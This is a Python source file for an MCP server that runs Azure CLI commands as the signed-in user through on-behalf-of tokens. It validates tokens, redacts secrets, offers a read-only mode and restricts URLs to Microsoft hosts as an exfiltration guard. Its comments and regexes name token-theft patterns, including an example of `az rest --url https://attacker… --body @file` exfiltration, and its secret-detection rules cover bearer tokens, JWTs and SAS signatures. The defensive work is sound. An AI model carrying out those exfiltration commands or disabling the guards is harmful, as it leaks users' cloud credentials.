import os, re, shlex, shutil, signal, socket, subprocess, tempfile, json, time, uuid, base64, threading
from collections import OrderedDict
from mcp.server.fastmcp import Context, FastMCP
from mcp.server.transport_security import TransportSecuritySettings

# Anything we DO write (only the audit log) is owner-only.
os.umask(0o077)

PUBLIC_HOST = os.environ.get("AZOBO_PUBLIC_HOST", "localhost")
TENANT = os.environ["AZOBO_TENANT_ID"]; CLIENT = os.environ["AZOBO_CLIENT_ID"]
DEFAULT_SUB = os.environ.get("AZOBO_DEFAULT_SUBSCRIPTION", "")
VENV_PY = os.environ.get("AZOBO_PYTHON", "/opt/azobo/venv/bin/python")
AZOBO = os.environ.get("AZOBO_WRAPPER", "/opt/azobo/azobo")
# The OBO cert lives ONLY in the broker process (separate user); the server and the
# `az` subprocess mint tokens over this local socket and never read the key.
BROKER_SOCKET = os.environ.get("AZOBO_BROKER_SOCKET", "/run/azobo/broker.sock")
TIMEOUT = int(os.environ.get("AZOBO_TIMEOUT", "150"))
MAX_OUT = int(os.environ.get("AZOBO_MAX_OUTPUT_CHARS", "100000"))  # ~25k tokens; full output kept in memory
AUDIT = os.environ.get("AZOBO_AUDIT_LOG", "/var/lib/azobo/audit.log")

# Hard ceiling on bytes CAPTURED from a single command (stdout+stderr). Enforced
# WHILE reading — the child is killed once it exceeds this, so a runaway
# `az ... download` can't buffer gigabytes into RAM before MAX_OUT (which only
# trims what we RETURN) ever applies.
MAX_CAPTURE = int(os.environ.get("AZOBO_MAX_CAPTURE_BYTES", str(20 * 1024 * 1024)))  # 20 MB

# Full captured output is retained IN MEMORY only (never written to disk) so a
# read_output can page it — bounded by entry count, TOTAL bytes, and TTL; evicted
# oldest-first. Lost on restart by design: a retrieval aid, not a record (audit is).
OUT_MAX = int(os.environ.get("AZOBO_OUTPUT_MAX_ENTRIES", "300"))
OUT_MAX_BYTES = int(os.environ.get("AZOBO_OUTPUT_MAX_BYTES", str(100 * 1024 * 1024)))  # 100 MB total
OUT_TTL = int(os.environ.get("AZOBO_OUTPUT_TTL_SECONDS", "1800"))

# Server-enforced read-only mode (defense-in-depth ON TOP OF per-user RBAC, which
# is the real boundary). When on: mutating `az` verbs (incl. rest/invoke non-GET)
# are refused. Default off — the deployment opts in (example env ships it ON).
READONLY = os.environ.get("AZOBO_READONLY", "").lower() in ("1", "true", "yes")

# Verify the incoming bearer is a real Entra token for THIS tenant+app before
# trusting ANY claim (signature/audience/issuer/expiry). Default ON. Turning it
# off trusts unsigned JWT payloads — lab / trusted-network only.
VALIDATE = os.environ.get("AZOBO_VALIDATE_TOKENS", "true").lower() in ("1", "true", "yes")
AUDIENCE = [x for x in (CLIENT, f"api://{CLIENT}", os.environ.get("AZOBO_AUDIENCE", "")) if x]

# Fail CLOSED: do not run with token validation OFF unless an operator EXPLICITLY
# acknowledges the insecure/dev posture (mirrors Orthanc's production OBO guard).
# "Off" trusts unsigned JWT payloads verbatim — lab / trusted-network only, never a
# silent default that a copied env could land in.
if not VALIDATE and os.environ.get("AZOBO_ALLOW_INSECURE", "").lower() not in ("1", "true", "yes"):
    raise SystemExit(
        "refusing to start: AZOBO_VALIDATE_TOKENS is off, which would trust unverified "
        "bearer payloads. Set AZOBO_VALIDATE_TOKENS=true, or (dev/lab only) explicitly "
        "acknowledge the insecure posture with AZOBO_ALLOW_INSECURE=1.")

# Caller authorization (beyond aud/iss/exp). Multi-client tenants: a token another
# client obtains for THIS resource app would otherwise pass. Set these in prod.
REQUIRED_SCOPE = os.environ.get("AZOBO_REQUIRED_SCOPE", "").strip()
ALLOWED_CLIENTS = [x.strip() for x in os.environ.get("AZOBO_ALLOWED_CLIENTS", "").split(",") if x.strip()]

# Command denylist (egress/exfil control). e.g. "account get-access-token" to remove
# the raw-token-to-stdout primitive. (`rest` is handled by the domain allow-list below,
# not a blanket deny, so legit raw-Graph/ARM still works.)
DENY_CMDS = [x.strip() for x in os.environ.get("AZOBO_DENY_COMMANDS", "").split(",") if x.strip()]

# `az rest`/`invoke` URL allow-list. An OBO token is only valid at the Microsoft
# first-party service it's audienced to — there is NO legitimate reason for `az rest`
# to target a non-Microsoft host, so anything else is exfiltration. We restrict the
# --url/--uri host to these domain suffixes; this keeps raw Graph/ARM working while
# killing `rest --url https://attacker… --body @file` token/file exfil. Blank/unset
# falls back to the default below; set "*" to deliberately disable. (Residual: an
# attacker controlling an Azure resource — e.g. their own *.blob.core.windows.net —
# is bounded/traceable; use an egress proxy allow-list to close even that.)
# Commercial Azure/Microsoft only by default. Sovereign-cloud operators (US Gov,
# China, etc.) add their own suffixes via AZOBO_REST_ALLOWED_DOMAINS.
_DEFAULT_REST_DOMAINS = ("microsoft.com,microsoftonline.com,windows.net,"
                         "azure.com,azure.net")
# A blank/unset value falls back to the default — so copying a blank example can't
# silently DISABLE the exfil guard. To deliberately opt out, set it to "*".
_rest_env = os.environ.get("AZOBO_REST_ALLOWED_DOMAINS", "").strip()
REST_ALLOWED = ([] if _rest_env == "*" else
                [d.strip().lower() for d in (_rest_env or _DEFAULT_REST_DOMAINS).split(",") if d.strip()])

# Concurrency cap (backstop alongside MemoryMax). Defaults to a small positive value
# so the SERVER enforces a memory ceiling on its own — worst-case live footprint is
# MAX_CONC x MAX_CAPTURE (default 8 x 20 MB = 160 MB) — even when the optional systemd
# MemoryMax isn't set. Set 0 to disable (unbounded).
MAX_CONC = int(os.environ.get("AZOBO_MAX_CONCURRENCY", "8"))
import contextlib
_sem = threading.Semaphore(MAX_CONC) if MAX_CONC > 0 else None
def _nullctx():
    return contextlib.nullcontext()

# Audit: redact secret-bearing flag VALUES from the logged command. We scrub
# STRUCTURALLY (over the tokenized argv), not by matching a literal flag string, so
# the same parser-desync that the exfil/write gates defend against can't sneak a
# secret past the log either:
#   - flags are matched by PREFIX (`--account-k` == `az`'s abbreviation of --account-key);
#   - ALL value tokens up to the next option are masked (nargs flags like
#     `--headers K=1 Authorization=<SECRET>` don't leak their tail);
#   - secret QUERY PARAMS inside any URL token (`?sig=`, `code=`, `AccountKey=`) are
#     masked even when the flag itself isn't secret (`--url https://…?sig=<SAS>`).
# Over-redaction is safe here: a false match only costs audit readability, never leaks.
_SECRET_FLAGS = ("password", "secret", "value", "client-secret", "certificate-password",
                 "body", "header", "headers", "token", "sas-token", "sas_token",
                 "account-key", "connection-string", "admin-password", "certificate")
_SECRET_QS = re.compile(
    r'((?:sig|code|access[_-]?token|id[_-]?token|refresh[_-]?token|account[_-]?key|'
    r'accountkey|password|secret|client[_-]?secret)=)[^&\s\'"]+', re.I)
# Fallback for when the command can't be tokenized (shouldn't happen post-parse).
_SECRET_FLAG = re.compile(
    r'(--(?:password|secret|value|client-secret|certificate-password|body|headers?|'
    r'token|sas[-_]?token|account-key|connection-string|admin-password)[ =])'
    r'("[^"]*"|\'[^\']*\'|\S+)', re.I)

def _redact_url_secrets(s):
    return _SECRET_QS.sub(lambda m: m.group(1) + "***", s)

def _is_secret_flag(flag):
    """A --flag (possibly az-abbreviated) whose value is secret. Prefix-matched: the
    typed flag must be a >=3-char prefix of a known secret flag name (so `--account-k`
    and `--pass` are caught the same as the CLI would expand them)."""
    f = flag.lstrip("-").lower()
    return len(f) >= 3 and any(name.startswith(f) for name in _SECRET_FLAGS)

def _scrub(cmd):
    if not cmd:
        return ""
    try:
        toks = shlex.split(cmd)
    except ValueError:
        return _SECRET_FLAG.sub(lambda m: m.group(1) + "***", cmd)[:500]
    out, i = [], 0
    while i < len(toks):
        t = toks[i]
        flag = t.split("=", 1)[0]
        if t.startswith("-") and _is_secret_flag(flag):
            if "=" in t:
                out.append(flag + "=***"); i += 1
            else:
                out.append(t); i += 1
                masked = False
                while i < len(toks) and not toks[i].startswith("-"):
                    i += 1; masked = True
                if masked:
                    out.append("***")
        else:
            out.append(_redact_url_secrets(t)); i += 1
    return " ".join(out)[:500]

# Redact secrets that appear in RETURNED/cached output too: bearer/JWT-shaped
# tokens, `Authorization:` headers, `"accessToken":` bodies, and URL secret params.
# Applied to what we return to the model AND what we retain for read_output.
_OUT_SECRET = re.compile(
    r'(?i)(bearer\s+|authorization["\':=\s]+bearer\s+|"?access[_-]?token"?\s*[:=]\s*"?|'
    r'"?id[_-]?token"?\s*[:=]\s*"?|"?refresh[_-]?token"?\s*[:=]\s*"?)([A-Za-z0-9._~+/=-]{20,})')
_JWT = re.compile(r'eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}')

def _scrub_output(s):
    if not s:
        return s
    s = _JWT.sub("***", s)
    s = _OUT_SECRET.sub(lambda m: m.group(1) + "***", s)
    return _redact_url_secrets(s)

# ---------------------------------------------------------------------------
# Command gating by SCANNING THE WHOLE argv for danger signals — never by trying
# to strip/normalize Azure CLI global options. `az` accepts globals in any
# position AND abbreviated (`az --deb rest …` == `--debug`, confirmed on 2.87.0),
# and can add new globals in future releases — so any "find the real command by
# removing known globals" approach is inherently leaky. Scanning for the signals
# themselves (the --url host, a non-GET --method, mutating verbs, denied phrases)
# is immune to flag position, abbreviation, and future globals. It errs toward
# reject: a false positive only ever REFUSES a command, it can never leak.
# ---------------------------------------------------------------------------
def _host_of(url):
    try:
        from urllib.parse import urlparse
        return (urlparse(url).hostname or "").lower()
    except Exception:
        return ""

def _host_allowed(host):
    return bool(host) and any(host == d or host.endswith("." + d) for d in REST_ALLOWED)

# A token whose ENTIRE value is an http(s) URL: a bare URL, an attached short-opt
# (`-uhttps://…`, `-u=https://…`), or a `--flag=https://…`. We match the whole token,
# NOT a substring, so a URL that merely appears INSIDE a larger value — e.g. a webhook
# endpoint embedded in a `--body {"url":"https://…"}` JSON blob, which is data sent TO
# an allowed host, not a destination — does not trip the exfil gate.
_TOKEN_URL = re.compile(r'^(?:--[^=\s]+=|-[A-Za-z]=?)?(https?://[^\s\'"]+)$', re.I)

def _argv_hosts(argv):
    """Every http(s) host that appears as a flag VALUE anywhere in argv, found by value
    SHAPE rather than by flag name. This deliberately does NOT reproduce `az`'s option
    parsing (the leaky path — see the doctrine above); keying on the URL value catches
    every form the CLI parses identically:
      - bare value after any flag  `--url … / --blob-url … / --source-uri …`
      - attached short-opt         `-uhttps://HOST/…`
      - `=` form                   `--url=…`, `--uri=…`, `-u=…`
      - DUPLICATE url flags         every value is returned, so `az`'s last-wins is moot
    Returns the hosts (lower-cased; "" if a value had no parseable host). Finding more
    URLs only ADDS allow-list constraints, so a false match can only ever REFUSE a
    command, never leak one — consistent with the scan doctrine."""
    hosts = []
    for t in argv:
        m = _TOKEN_URL.match(t)
        if m:
            hosts.append(_host_of(m.group(1)))
    return hosts

def _method_nonget(argv):
    """rest/invoke *write* signal: a --method/-m that isn't GET, in ANY form `az` accepts
    — space, `=`, attached short (`-mPOST`), or unambiguous abbreviation (`--meth POST`).
    We over-match the flag SPELLING (any >=3-char prefix of `--method`, plus attached
    `-m<val>`); since a false match only tightens READONLY (refuses), never leaks, the
    superset is safe. Gated on rest/invoke because only they take --method (elsewhere
    `-m`/`--m…` mean other things, e.g. `--max-items`)."""
    if not (("rest" in argv) or ("invoke" in argv)):
        return False
    def _method_flag(flag):
        return flag == "-m" or (len(flag) >= 3 and "--method".startswith(flag))
    m = "GET"
    for i, t in enumerate(argv):
        if t.startswith("-m") and not t.startswith("--") and len(t) > 2:
            m = t[3:] if t.startswith("-m=") else t[2:]          # -mPOST / -m=POST
            continue
        flag = t.split("=", 1)[0]
        if _method_flag(flag):
            if "=" in t:
                m = t.split("=", 1)[1]
            elif i + 1 < len(argv):
                m = argv[i + 1]
    return m.strip().upper() != "GET"

def _deny_hit(argv):
    """A DENY_CMDS entry present as an ORDER-PRESERVING SUBSEQUENCE of argv — so an
    interleaved/prefixed global (`-o json account get-access-token`) can't dodge it."""
    for d in DENY_CMDS:
        needles = d.split()
        if needles:
            it = iter(argv)
            if all(n in it for n in needles):
                return True
    return False

# Azure CLI verbs that mutate — refused in read-only mode. INTENTIONALLY NON-EXHAUSTIVE
# and fail-open BY DESIGN: the CLI has no clean read/write taxonomy and adds verbs
# constantly, so no static denylist is complete. Safe because READONLY grants nothing —
# an uncaught verb still runs only under the caller's own RBAC ∩ OBO consent. It's a
# guardrail against accidental writes, NOT a boundary; RBAC is the boundary. For a real
# read-only deployment assign Reader RBAC. (See "Deliberate limitations" in the README.)
_MUTATING = {"create", "delete", "update", "set", "add", "remove", "purge", "regenerate",
             "reset", "restart", "start", "stop", "deallocate", "import", "upload", "attach",
             "detach", "enable", "disable", "assign", "grant", "revoke", "move", "run-command",
             "invoke", "generate", "rotate", "renew", "approve", "reject", "wait", "lock"}

try:
    os.makedirs(os.path.dirname(AUDIT) or ".", exist_ok=True)
except OSError:
    pass  # audit writes are best-effort; don't let a perms hiccup block startup
_lock = threading.Lock()
_outputs = OrderedDict()  # output_id -> (owner_oid, text, ts)

mcp = FastMCP("azure-obo",
    instructions=("Operate Azure and Entra AS THE SIGNED-IN USER (per-user on-behalf-of). "
        "az_run = the full Azure CLI: management plane, the `az ad` directory (Entra apps, "
        "service principals, users, groups), AND any other endpoint via "
        "`rest --method GET --url <url>` (e.g. raw Microsoft Graph). read_output pages a "
        "previous command's full output if it was truncated. Everything is bounded by the "
        "user's own Azure RBAC + Entra role — a 403 / AuthorizationFailed is their permission "
        "boundary, not a bug."),
    host="127.0.0.1", port=8782, stateless_http=False, json_response=False, streamable_http_path="/",
    transport_security=TransportSecuritySettings(
        allowed_hosts=[PUBLIC_HOST, f"{PUBLIC_HOST}:443", "127.0.0.1:8782", "localhost:8782"],
        allowed_origins=[f"https://{PUBLIC_HOST}", "http://127.0.0.1:8782"]))

def _bearer(ctx):
    try:
        h = ctx.request_context.request.headers.get("authorization", "") or ""
        return h[7:].strip() if h[:7].lower() == "bearer " else h.strip()
    except Exception:
        return ""

def _broker(req):
    """One request → one response against the OBO credential broker (the only holder
    of the cert). Newline-delimited JSON over the local Unix socket."""
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(TIMEOUT)
    try:
        s.connect(BROKER_SOCKET)
        s.sendall((json.dumps(req) + "\n").encode())
        buf = b""
        while b"\n" not in buf:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
        return json.loads(buf.split(b"\n", 1)[0] or b"{}")
    finally:
        s.close()

_jwks = None
def _jwks_client():
    global _jwks
    if _jwks is None:
        from jwt import PyJWKClient
        _jwks = PyJWKClient(f"https://login.microsoftonline.com/{TENANT}/discovery/v2.0/keys")
    return _jwks

def _ident(c):
    """(owner_key, display) from claims. Owner = oid (immutable, always present —
    the right key for output ownership); display = upn for the human-readable audit."""
    owner = c.get("oid") or c.get("upn") or c.get("preferred_username") or "?"
    display = c.get("preferred_username") or c.get("upn") or c.get("oid") or "?"
    return (owner, display)

def _identity(bearer):
    """Return (owner_oid, display) ONLY after the token is cryptographically verified
    for this tenant+app (signature via JWKS, audience, issuer, expiry). Returns None
    when the token fails validation — callers MUST reject. This is the access control
    for read_output (which never does an OBO exchange). When AZOBO_VALIDATE_TOKENS is
    off, falls back to the unverified payload (lab/trusted only).

    NOTE: when AZOBO_VALIDATE_TOKENS is off, `oid` comes from an UNVERIFIED,
    caller-controllable payload — so read_output's cross-user ownership guard (which
    keys on this oid) is effectively VOID. Insecure mode is single-user / trusted only;
    the unguessable 48-bit output_id is then the sole barrier between callers."""
    if not bearer:
        return None
    if not VALIDATE:
        try:
            p = bearer.split('.')[1]; p += '=' * (-len(p) % 4)
            return _ident(json.loads(base64.urlsafe_b64decode(p)))
        except Exception:
            return ("?", "?")
    try:
        import jwt
        signing = _jwks_client().get_signing_key_from_jwt(bearer).key
        claims = jwt.decode(bearer, signing, algorithms=["RS256"], audience=AUDIENCE,
                            options={"require": ["exp"], "verify_aud": True})
        if claims.get("iss", "") not in (f"https://login.microsoftonline.com/{TENANT}/v2.0",
                                          f"https://sts.windows.net/{TENANT}/"):
            return None
        if REQUIRED_SCOPE and REQUIRED_SCOPE not in str(claims.get("scp", "")).split():
            return None
        if ALLOWED_CLIENTS and (claims.get("azp") or claims.get("appid")) not in ALLOWED_CLIENTS:
            return None
        return _ident(claims)
    except Exception:
        return None

def _audit(who, tool, cmd, rc, dur, n, oid):
    rec = json.dumps({"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "who": who,
                      "tool": tool, "cmd": _scrub(cmd), "rc": rc, "dur": round(dur, 2),
                      "out_chars": n, "output_id": oid})
    try:
        with _lock, open(AUDIT, "a") as f:
            f.write(rec + "\n")
    except Exception as e:
        # Fail-OPEN would drop the record silently if the FSIZE-limited data path is
        # full/unwritable. Fall back to stderr so systemd/journald captures a
        # durable copy on a separate sink, and mark the degraded state — never a
        # silent accountability gap.
        try:
            import sys
            print(f"AUDIT-FALLBACK ({type(e).__name__}): {rec}", file=sys.stderr, flush=True)
        except Exception:
            pass

def _store(who, out):
    """Retain captured output in memory (owner-stamped), evicting expired, then
    oldest until BOTH the entry-count and total-byte budgets are satisfied."""
    oid = uuid.uuid4().hex[:12]; now = time.time()
    with _lock:
        _outputs[oid] = (who, out, now)
        for k in [k for k, (_o, _t, ts) in _outputs.items() if now - ts > OUT_TTL]:
            _outputs.pop(k, None)
        total = sum(len(v[1]) for v in _outputs.values())
        while _outputs and (len(_outputs) > OUT_MAX or total > OUT_MAX_BYTES):
            _k, (_o, _t, _ts) = _outputs.popitem(last=False)
            total -= len(_t)
    return oid

def _finalize(owner, who, tool, cmd, out, rc, dur):
    """Retain full output in memory (owner-stamped by oid), audit, return capped view.
    Output is secret-scrubbed FIRST so bearer/JWT tokens and SAS query params —
    e.g. from `--debug`/`--verbose` HTTP diagnostics or an error body — are redacted in
    BOTH what we return to the model and what read_output can page back later."""
    out = _scrub_output(out)
    oid = _store(owner, out)
    _audit(who, tool, cmd, rc, dur, len(out), oid)
    if len(out) <= MAX_OUT:
        return out
    return out[:MAX_OUT] + (f"\n\n[…TRUNCATED: returned {MAX_OUT} of {len(out)} chars. Full output "
        f"held in memory as output_id='{oid}' (expires in ~{OUT_TTL // 60}m). Read the rest with "
        f"read_output(output_id='{oid}', offset={MAX_OUT}), or re-run with a narrower --query / -o tsv / --top.]")

def _mutates(argv):
    """Read-only write-detection, WHOLE-argv: a mutating verb anywhere, OR a non-GET
    --method anywhere (the rest/invoke write signal a plain verb check misses). No
    global-flag stripping — see the scan-based rationale above. Defense-in-depth
    only; per-user RBAC is the authoritative boundary."""
    if any(t in _MUTATING for t in argv):
        return True
    return _method_nonget(argv)

def _run_capped(argv, env, timeout, cap):
    """Run the wrapper, capturing stdout and stderr on SEPARATE pipes (so the caller
    keeps the rc==0 -> clean-stdout contract — az writes WARNING/deprecation lines to
    stderr even on success, and the agent json.loads our stdout). Binary-safe (raw
    bytes, decoded at the end). Total captured is capped at `cap` BYTES across both
    streams; the child's whole process group is SIGKILLed the instant it exceeds the
    cap, so a runaway download can't buffer gigabytes into RAM. Returns
    (stdout, stderr, rc, capped, timed_out)."""
    p = subprocess.Popen(argv, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         start_new_session=True)  # binary pipes
    out_buf, err_buf = [], []; total = [0]; capped = [False]; mu = threading.Lock()
    def drain(stream, buf):
        try:
            while True:
                chunk = stream.read(65536)
                if not chunk:
                    break
                with mu:
                    room = cap - total[0]
                    if room > 0:
                        take = chunk[:room]; buf.append(take); total[0] += len(take)
                    if total[0] >= cap and not capped[0]:
                        capped[0] = True
                        try: os.killpg(p.pid, signal.SIGKILL)
                        except Exception: pass
                        return
        except Exception:
            pass
    threads = [threading.Thread(target=drain, args=(s, b), daemon=True)
               for s, b in ((p.stdout, out_buf), (p.stderr, err_buf))]
    for t in threads: t.start()
    timed_out = False
    try:
        rc = p.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True; rc = -1
        try: os.killpg(p.pid, signal.SIGKILL)
        except Exception: pass
        p.wait()
    for t in threads: t.join(timeout=5)
    return (b"".join(out_buf).decode(errors="replace"),
            b"".join(err_buf).decode(errors="replace"), rc, capped[0], timed_out)

@mcp.tool()
def az_run(command: str, ctx: Context) -> str:
    """Run a raw Azure CLI command AS YOU (the signed-in user, via on-behalf-of) and return its output.
    Write it as in a terminal but WITHOUT the leading `az` (e.g. `network vnet show -g RG -n NAME -o json`,
    `vm list -o table`, `group list --query "[].name"`, `ad app list`). Full az surface, under YOUR Azure
    RBAC. Directory works too: `ad app/sp/user/group ...`. For raw Microsoft Graph or any other
    endpoint/audience use `rest --method GET --url <url>` (e.g. `rest --url https://graph.microsoft.com/v1.0/me`).
    Rules: ONE command per call (no `&&`/pipes/`--follow`/`--watch`); filter with `--query` (JMESPath) and
    `-o json/table/tsv`. Large output is truncated in the reply but FULLY retained — page it with
    read_output(output_id). A 403/AuthorizationFailed/empty result outside your scope is your permission
    boundary, not an error to route around. Writes (create/delete, role/app changes) are real."""
    a = _bearer(ctx)
    if not a:
        return json.dumps({"error": "no bearer token on request"})
    ident = _identity(a)
    if ident is None:
        return json.dumps({"error": "unauthenticated: bearer failed validation (signature/audience/issuer/expiry)"})
    owner, who = ident
    try:
        argv = shlex.split(command)
    except ValueError as e:
        return json.dumps({"error": f"could not parse command: {e}"})
    # Gates SCAN THE WHOLE argv for danger signals (see the rationale above the scan
    # helpers): immune to global-flag position, abbreviation (`az --deb rest …`), and
    # future az globals. Erring toward reject can only refuse a command, never leak.
    if "interactive" in argv or "ssh" in argv:
        return json.dumps({"error": "`az interactive` / `az ssh` are interactive/never-return and are not "
                                    "supported here. Use --no-wait + poll, or a bounded query."})
    if any(t in ("--follow", "--watch") for t in argv):
        return json.dumps({"error": "--follow/--watch never return here. Fetch a bounded snapshot "
                                    "(e.g. --lines N) or use --no-wait + poll."})
    if READONLY and _mutates(argv):
        return json.dumps({"error": "server is in read-only mode (AZOBO_READONLY): this command appears "
                                    "to mutate (a write verb, or rest/invoke with a non-GET method). "
                                    "Only read operations are permitted."})
    if _deny_hit(argv):
        return json.dumps({"error": "that command is disabled on this server (AZOBO_DENY_COMMANDS)."})
    # Anti-exfiltration: EVERY http(s) URL anywhere in argv must resolve to an
    # allow-listed Microsoft/Azure host. An OBO token is only valid at Microsoft
    # first-party services, so any other host is exfiltration — reject. We check the
    # URL values themselves (not flag names), so attached short-opts (`-uHOST`),
    # duplicate `--url` (az last-wins), abbreviations, and non-rest url flags
    # (`--blob-url`, `--source-uri`) are all covered. Erring toward reject can't leak.
    if REST_ALLOWED:
        bad = next((h for h in _argv_hosts(argv) if not _host_allowed(h)), None)
        if bad is not None:
            return json.dumps({"error": f"az is restricted to Microsoft/Azure endpoints; host "
                f"{bad!r} is not allowed. OBO tokens are only valid at Microsoft first-party services — "
                "targeting anything else is rejected (AZOBO_REST_ALLOWED_DOMAINS)."})

    # Register a short-lived broker session for this user, and hand the subprocess
    # only the opaque session id — NOT the assertion and NOT the cert. The wrapper
    # mints tokens by presenting the session over the broker socket.
    try:
        reg = _broker({"op": "register", "assertion": a})
    except Exception as e:
        return json.dumps({"error": f"credential broker unreachable: {type(e).__name__}: {str(e)[:120]}"})
    sid = reg.get("session")
    if not sid:
        return json.dumps({"error": f"broker register failed: {reg.get('error', 'no session')}"})

    cfg = tempfile.mkdtemp(prefix="azcfg-"); t0 = time.time()
    env = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"),
           "HOME": cfg, "LANG": os.environ.get("LANG", "C.UTF-8"),
           "AZURE_TENANT_ID": TENANT, "AZURE_SUBSCRIPTION_ID": DEFAULT_SUB,
           # AZURE_CONFIG_DIR stays per-call ephemeral (profile/token-cache isolation
           # between calls — the actual security-relevant boundary). Extensions are
           # static, non-secret, identical across every call, and pre-baked at build
           # time (never installed at runtime — see AZURE_CORE_DISABLE_DYNAMIC_INSTALL
           # below), so they live at a fixed path instead of the ephemeral cfg dir.
           "AZURE_CONFIG_DIR": cfg,
           "AZURE_EXTENSION_DIR": os.environ.get("AZOBO_EXTENSION_DIR", "/opt/az-extensions"),
           "AZURE_CORE_DISABLE_DYNAMIC_INSTALL": "yes", "AZURE_CORE_COLLECT_TELEMETRY": "no",
           "AZOBO_BROKER_SOCKET": BROKER_SOCKET, "AZOBO_SESSION": sid}
    try:
        with (_sem or _nullctx()):
            so, se, rc, capped, timed_out = _run_capped([VENV_PY, AZOBO] + argv, env, TIMEOUT, MAX_CAPTURE)
        if timed_out:
            out = json.dumps({"error": f"timed out after {TIMEOUT}s — for long ops use --no-wait + poll status"})
        else:
            # Clean contract: on success return stdout only (az writes warnings to
            # stderr even on rc==0); only fold stderr in on failure.
            out = (so if rc == 0 else (so + se)).strip() or "(no output)"
            if capped:
                out += (f"\n\n[…CAPPED: output exceeded {MAX_CAPTURE} bytes and the command was terminated. "
                        "Narrow it with --query / -o tsv / --top, or download to Azure-side storage instead.]")
    finally:
        shutil.rmtree(cfg, ignore_errors=True)
        try: _broker({"op": "end", "session": sid})  # best-effort; broker also TTLs
        except Exception: pass
    return _finalize(owner, who, "az_run", command, out, rc, time.time() - t0)

@mcp.tool()
def read_output(output_id: str, ctx: Context, offset: int = 0, max_chars: int = 0) -> str:
    """Read (more of) a previous command's FULL retained output when az_run truncated it.
    Pass the output_id from the truncation note. offset = start char; max_chars = how many (default = cap).
    Only the user who produced the output can read it; output is held in memory and expires."""
    a = _bearer(ctx)
    ident = _identity(a)
    if ident is None:
        return json.dumps({"error": "unauthenticated: bearer failed validation"})
    caller_owner, _who = ident
    if not re.fullmatch(r"[0-9a-f]{1,32}", output_id or ""):
        return json.dumps({"error": "bad output_id"})
    now = time.time()
    with _lock:
        v = _outputs.get(output_id)
        if v and now - v[2] > OUT_TTL:
            _outputs.pop(output_id, None); v = None
    # Single indistinguishable error for missing / expired / wrong-owner so a caller
    # holding someone else's output_id can't tell "live but not yours" from "gone"
    # (no existence oracle). The 48-bit id remains the capability barrier.
    _NF = json.dumps({"error": "output_id not found (expired/evicted or wrong id)"})
    if not v:
        return _NF
    owner, data, _ts = v
    if owner != caller_owner:
        return _NF
    m = max_chars or MAX_OUT; chunk = data[offset:offset + m]; end = offset + len(chunk)
    more = (f"\n\n[chars {offset}-{end} of {len(data)}; more: read_output('{output_id}', offset={end})]"
            if end < len(data) else "")
    return chunk + more

from mcp import types as _t
for _rt in (_t.ListResourcesRequest, _t.ReadResourceRequest, _t.ListResourceTemplatesRequest,
            _t.ListPromptsRequest, _t.GetPromptRequest, _t.SubscribeRequest, _t.UnsubscribeRequest):
    mcp._mcp_server.request_handlers.pop(_rt, None)

if __name__ == "__main__":
    mcp.run(transport="streamable-http")
